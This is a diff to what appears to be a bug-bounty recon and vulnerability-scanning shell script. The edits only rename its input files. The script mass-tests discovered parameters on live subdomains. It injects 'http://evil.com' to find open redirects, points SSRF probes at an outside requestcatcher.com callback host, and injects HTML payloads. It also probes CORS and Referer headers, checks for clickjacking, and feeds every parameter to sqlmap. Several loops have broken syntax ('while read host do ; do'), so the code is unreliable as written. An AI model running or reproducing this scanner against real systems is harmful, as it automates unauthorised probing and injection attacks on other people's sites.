@@ -90,11 +90,11 @@ subzy --targets  $url/recon/final_subs.txt  --timeout 200  --hide_fails >> $url/
 echo "[+]Enumurating Params From Paramspider...."
 python3 /opt/Paramspider/paramspider.py --level high -d $url -p noor -o $1/recon/params.txt
 echo "[+]Enumurating Params From Waybackurls...."
-cat $1/recon/fsubs.txt | waybackurls | grep = | qsreplace noor >> $url/recon/params.txt
+cat $1/recon/live_subs.txt | waybackurls | grep = | qsreplace noor >> $url/recon/params.txt
 echo "[+]Enumurating Params From gau Tool...."
 gau --subs  $url | grep = | qsreplace noor >> $url/recon/params.txt 
 echo "[+]Enumurating Params From gauPlus Tool...."
-cat $url/recon/fsubs.txt | gauplus | grep = | qsreplace noor >> $url/recon/params.txt
+cat $url/recon/live_subs.txt | gauplus | grep = | qsreplace noor >> $url/recon/params.txt
 
 echo "[+]Filtering Dups..."
 cat $url/recon/params.txt | sort -u | tee $url/recon/final_params.txt 
@@ -107,34 +107,34 @@ cat $url/recon/final_params.txt | wc -l
 #-------------------------------Checking For Open Redirects----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For Openredirects"
-cat $url/recon/fparams.txt | qsreplace 'http://evil.com' | while read host do ; do curl -s -L $host -I | grep "evil.com" && echo "$host" ;done > $url/recon/open.txt
+cat $url/recon/final_params.txt | qsreplace 'http://evil.com' | while read host do ; do curl -s -L $host -I | grep "evil.com" && echo "$host" ;done >> $url/recon/open_redirect.txt
 #--------------------------------------------------------------------------------------------------
 #-----------------------------------Checking For SSRF----------------------------------------------
 #--------------------------------------------------------------------------------------------------
-cat $url/recon/fparams.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/recon/eSSRF.txt
+cat $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/recon/eSSRF.txt
 rm $url/recon/ssrftest.txt
 #--------------------------------------------------------------------------------------------------
 #-------------------------------Checking For HTMLi && RXSS-----------------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For HTML Injection"
-cat $url/recon/fparams.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/htmli.txt
+cat $url/recon/final_params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/htmli.txt
 #--------------------------------------------------------------------------------------------------
 #-----------------------------------Checking For Clickjacking--------------------------------------
 #--------------------------------------------------------------------------------------------------
-cat $url/recon/fsubs.txt | while read host do ; do curl -I -L --silent --path-as-is --insecure "$host" | grep -qs "x-frame-options" && echo "$host \033[0;31mNot\n" || echo  "$host  \033[0;31mVulnerable" ; done | grep Vulnerable >> $url/recon/clickjack.txt
+cat $url/recon/live_subs.txt | while read host do ; do curl -I -L --silent --path-as-is --insecure "$host" | grep -qs "x-frame-options" && echo "$host \033[0;31mNot\n" || echo  "$host  \033[0;31mVulnerable" ; done | grep Vulnerable >> $url/recon/clickjack.txt
 #------------------------------------------------------------------------------------------------------------
 #----------------------------------------------Checking For CORS---------------------------------------------
 #------------------------------------------------------------------------------------------------------------
-cat $url/recon/fsubs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Origin:beebom.com | grep "beebom.com" && echo "$host" ; done >> $url/recon/cors.txt
+cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Origin:beebom.com | grep "beebom.com" && echo "$host" ; done >> $url/recon/cors.txt
 #------------------------------------------------------------------------------------------------------------
 #--------------------------------------Checking For XSS through Referer Header-------------------------------
 #------------------------------------------------------------------------------------------------------------
-cat $url/recon/fsubs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer:https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/recon/xssrefer.txt
+cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer:https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/recon/xssrefer.txt
 #--------------------------------------------------------------------------------------------------
 #---------------------------Checking For Sql Injection Vulnerability-------------------------------
 #--------------------------------------------------------------------------------------------------
 echo "[+]Testing For Sqli"
-cat $url/recon/fparams.txt | python3 /opt/sqlmap/sqlmap.py
+cat $url/recon/final_params.txt | python3 /opt/sqlmap/sqlmap.py
 #------------------------------------------------------------------------------------------------------------
 #---------------------------------Checking For Open redirects through X-Forwarded Header---------------------
 #------------------------------------------------------------------------------------------------------------
